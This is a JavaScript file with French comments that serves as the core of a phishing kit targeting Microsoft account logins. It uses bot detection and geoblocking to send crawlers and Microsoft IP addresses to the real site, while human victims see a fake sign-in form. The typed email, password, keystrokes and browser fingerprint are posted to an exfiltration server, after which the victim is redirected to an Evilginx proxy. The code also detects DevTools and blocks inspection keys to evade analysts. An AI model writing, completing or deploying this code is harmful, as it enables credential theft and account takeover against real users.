// ═══════════════════════════════════════════════════════════════════
// LOGIQUE PRINCIPALE - CLOAKING UNIVERSEL 2025
// ═══════════════════════════════════════════════════════════════════
//
// Ce fichier orchestre tout le système de cloaking:
// 1. Détection bot (invisible)
// 2. Géoblocage
// 3. Redirection intelligente
// 4. Exfiltration données
//
// ═══════════════════════════════════════════════════════════════════

(async function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════════
    // INITIALISATION
    // ═══════════════════════════════════════════════════════════════

    const botDetector = new BotDetector(CONFIG);
    const geoBlocker = new GeoBlocker(CONFIG);

    let finalDecision = null;

    // ═══════════════════════════════════════════════════════════════
    // PHASE 1: DÉTECTION GÉOGRAPHIQUE (EN PARALLÈLE)
    // ═══════════════════════════════════════════════════════════════

    const geoCheck = geoBlocker.checkAccess();

    // ═══════════════════════════════════════════════════════════════
    // PHASE 2: DÉTECTION BOT (EN PARALLÈLE)
    // ═══════════════════════════════════════════════════════════════

    const botAnalysis = botDetector.analyze();

    // ═══════════════════════════════════════════════════════════════
    // PHASE 3: ATTENDRE LES RÉSULTATS
    // ═══════════════════════════════════════════════════════════════

    const [geoResult, botResult] = await Promise.all([geoCheck, botAnalysis]);

    if (CONFIG.DEBUG_MODE) {
        console.log('═══════════════════════════════════════');
        console.log('RÉSULTATS ANALYSE');
        console.log('═══════════════════════════════════════');
        console.log('GEO:', geoResult);
        console.log('BOT:', botResult);
        console.log('═══════════════════════════════════════');
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 4: DÉCISION FINALE
    // ═══════════════════════════════════════════════════════════════

    // Cas 1: Pays bloqué → redirect immédiat
    if (!geoResult.allowed) {
        redirectToURL(CONFIG.GEO_BLOCKED_URL, 'geo_blocked', {
            country: geoBlocker.getGeoInfo().country,
            reason: geoResult.reason
        });
        return;
    }

    // Cas 2: Bot détecté → redirect vers vraie page Microsoft
    if (botResult.isBot) {
        redirectToURL(CONFIG.BOT_URL, 'bot_detected', {
            score: botResult.score,
            signals: botResult.signals.map(s => s.name)
        });
        return;
    }

    // Cas 3: IP Microsoft détectée → redirect sécurisé
    if (geoResult.geoData && geoBlocker.isMicrosoftIP(geoResult.geoData.ip)) {
        redirectToURL(CONFIG.BOT_URL, 'microsoft_ip', {
            ip: geoResult.geoData.ip
        });
        return;
    }

    // Cas 4: Suspect → afficher page mais log
    if (botResult.isSuspicious) {
        if (CONFIG.DEBUG_MODE) {
            console.warn('[CLOAKING] User is suspicious (score: ' + botResult.score + ')');
        }
        // On affiche quand même la page mais on log
        await logSuspiciousVisit({
            botScore: botResult.score,
            geoData: geoResult.geoData,
            signals: botResult.signals
        });
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 5: VICTIME HUMAINE → AFFICHER PAGE PHISHING
    // ═══════════════════════════════════════════════════════════════

    showPhishingPage(geoResult, botResult);

    // ═══════════════════════════════════════════════════════════════
    // PHASE 6: GÉRER LA SOUMISSION DU FORMULAIRE
    // ═══════════════════════════════════════════════════════════════

    document.getElementById('phishForm').addEventListener('submit', async (e) => {
        e.preventDefault();

        const formData = {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            remember: document.getElementById('remember').checked,
            timing: botDetector.getInteractionTime(),
            mouseMovements: botDetector.mouseMovements,
            keyPresses: botDetector.keyPresses,
            botScore: botResult.score,
            geoData: geoResult.geoData,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // Exfiltrer les données
        if (CONFIG.ENABLE_EXFILTRATION) {
            await exfiltrateData(formData);
        }

        // Rediriger vers Evilginx
        redirectToURL(CONFIG.VICTIM_URL, 'victim_submit', formData);
    });

    // ═══════════════════════════════════════════════════════════════
    // FONCTIONS UTILITAIRES
    // ═══════════════════════════════════════════════════════════════

    /**
     * Afficher la page de phishing
     */
    function showPhishingPage(geoResult, botResult) {
        // Masquer le loading screen
        document.getElementById('loadingScreen').style.display = 'none';

        // Afficher le contenu principal
        document.getElementById('mainContent').style.display = 'block';

        // Personnaliser avec la config
        document.getElementById('pageTitle').textContent = CONFIG.PHISHING_PAGE.title;
        document.getElementById('logo').src = CONFIG.PHISHING_PAGE.logo_url;
        document.getElementById('mainTitle').textContent = CONFIG.PHISHING_PAGE.company + ' Account';
        document.getElementById('warningTitle').textContent = CONFIG.PHISHING_PAGE.warning_title;
        document.getElementById('warningMessage').textContent = CONFIG.PHISHING_PAGE.warning_message;
        document.getElementById('emailLabel').textContent = CONFIG.PHISHING_PAGE.email_label;
        document.getElementById('passwordLabel').textContent = CONFIG.PHISHING_PAGE.password_label;
        document.getElementById('submitBtn').textContent = CONFIG.PHISHING_PAGE.submit_button;
        document.getElementById('rememberLabel').textContent = CONFIG.PHISHING_PAGE.remember_me;

        if (CONFIG.DEBUG_MODE) {
            console.log('[CLOAKING] ✅ Showing phishing page to victim');
            console.log('[CLOAKING] Bot score:', botResult.score);
            console.log('[CLOAKING] Country:', geoResult.geoData?.country);
        }
    }

    /**
     * Redirection vers URL avec logging
     */
    function redirectToURL(url, reason, metadata = {}) {
        if (CONFIG.DEBUG_MODE) {
            console.log(`[CLOAKING] 🔄 Redirecting to: ${url}`);
            console.log(`[CLOAKING] Reason: ${reason}`);
            console.log(`[CLOAKING] Metadata:`, metadata);
        }

        // Log avant redirection
        logRedirect(url, reason, metadata);

        // Petite attente pour que le log parte
        setTimeout(() => {
            window.location.href = url;
        }, 100);
    }

    /**
     * Exfiltrer les données vers le serveur
     */
    async function exfiltrateData(data) {
        try {
            const response = await fetch(CONFIG.EXFIL_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
                },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                if (CONFIG.DEBUG_MODE) {
                    console.log('[EXFIL] ✅ Data exfiltrated successfully');
                }
                return true;
            } else {
                if (CONFIG.DEBUG_MODE) {
                    console.warn('[EXFIL] ⚠️ Exfiltration failed:', response.status);
                }
                return false;
            }
        } catch (e) {
            if (CONFIG.DEBUG_MODE) {
                console.error('[EXFIL] ❌ Exfiltration error:', e.message);
            }
            return false;
        }
    }

    /**
     * Logger une visite suspecte
     */
    async function logSuspiciousVisit(data) {
        if (!CONFIG.ENABLE_EXFILTRATION) return;

        try {
            await fetch(CONFIG.EXFIL_URL + '/suspicious', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
                },
                body: JSON.stringify({
                    type: 'suspicious_visit',
                    ...data,
                    timestamp: new Date().toISOString()
                })
            });
        } catch (e) {
            // Silent fail
        }
    }

    /**
     * Logger une redirection
     */
    async function logRedirect(url, reason, metadata) {
        if (!CONFIG.ENABLE_EXFILTRATION) return;

        try {
            await fetch(CONFIG.EXFIL_URL + '/redirect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
                },
                body: JSON.stringify({
                    type: 'redirect',
                    url: url,
                    reason: reason,
                    metadata: metadata,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            });
        } catch (e) {
            // Silent fail
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // PROTECTION CONTRE INSPECTION
    // ═══════════════════════════════════════════════════════════════

    // Détecter DevTools ouvert
    (function() {
        const devtools = {
            isOpen: false,
            orientation: null
        };

        const threshold = 160;

        setInterval(function() {
            if (window.outerWidth - window.innerWidth > threshold ||
                window.outerHeight - window.innerHeight > threshold) {

                if (!devtools.isOpen) {
                    devtools.isOpen = true;

                    if (CONFIG.DEBUG_MODE) {
                        console.warn('[SECURITY] DevTools detected! Redirecting...');
                    }

                    // Rediriger si DevTools ouvert (probable analyste)
                    redirectToURL(CONFIG.BOT_URL, 'devtools_detected', {});
                }
            } else {
                devtools.isOpen = false;
            }
        }, 500);
    })();

    // Bloquer clic droit
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });

    // Bloquer F12, Ctrl+Shift+I, etc.
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
            return false;
        }
    });

})();
